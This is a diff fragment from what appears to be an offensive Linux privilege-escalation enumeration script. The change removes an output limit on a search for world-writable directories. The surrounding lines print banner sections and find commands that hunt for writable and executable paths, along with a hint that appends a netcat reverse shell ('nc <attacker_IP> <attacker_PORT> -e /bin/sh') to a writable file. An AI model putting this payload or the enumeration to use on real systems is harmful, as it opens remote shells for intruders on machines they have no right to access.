@@ -3403,7 +3403,7 @@ echo -e "\n${RED}Run this command manually: find / -writable -type f 2>/dev/null
         echo -e "\t║    netcat: echo 'nc <attacker_IP> <attacker_PORT> -e /bin/sh' >> file                                              ║"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}╔═════{ World writable directories:${XX}"
-    find / -type d \( -perm -g+w -o -perm -o+w \) -exec ls -lad --color=always {} \; | head -100 2>/dev/null
+    find / -type d \( -perm -g+w -o -perm -o+w \) -exec ls -lad --color=always {} \; 2>/dev/null
 echo -e "\n${BLUE}╔═════{ World executable folders:${XX}"
     find / -perm o=x -type d 2>/dev/null
 echo -e "\n${BLUE}╔═════{ World Writable files:${XX}"
